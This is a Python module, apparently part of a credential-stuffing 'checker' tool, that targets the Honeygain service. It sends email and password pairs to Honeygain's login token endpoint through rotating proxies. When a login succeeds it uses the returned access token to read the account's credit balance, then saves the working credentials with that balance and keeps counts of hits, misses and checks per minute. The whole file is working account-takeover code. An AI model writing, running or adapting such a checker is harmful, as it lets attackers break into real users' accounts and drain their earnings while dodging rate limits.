from __main__ import checker
from requests import post,get
from modules.functions import bad_proxy, log,save,set_proxy


def check(email:str,password:str):
    retries = 0
    while retries != checker.retries:
        proxy = set_proxy()
        payload = {"email":email,"password":password}
        header = {"Authorization":"Bearer "}
        try:
            a = post("https://dashboard.honeygain.com/api/v1/users/tokens",json=payload,proxies=set_proxy(proxy),timeout=checker.timeout)
            if "Bad credentials." in a.text:
                retries += 1
            elif "access_token" in a.text:
                header["Authorization"] = "Bearer "+a.json()["data"]["access_token"]
                balance = get("https://dashboard.honeygain.com/api/v1/users/balances",headers=header,proxies=set_proxy(proxy),timeout=checker.timeout).json()["data"]["payout"]["credits"]
                if not checker.cui: 
                    log("good",email+":"+password,"Honeygain")
                if int(balance) > 0: 
                    save("Honeygain","good",checker.time,email+":"+password+f" | Credits: {balance}")
                    checker.good += 1
                else: 
                    save("Honeygain","custom",checker.time,email+":"+password+f" | Credits: {balance}")
                    checker.custom += 1
                checker.cpm += 1
                return
            else:
                raise
        except:
            bad_proxy(proxy)
            checker.errors += 1
    if not checker.cui: log("bad",email+":"+password,"Honeygain")
    checker.bad += 1
    checker.cpm += 1
    return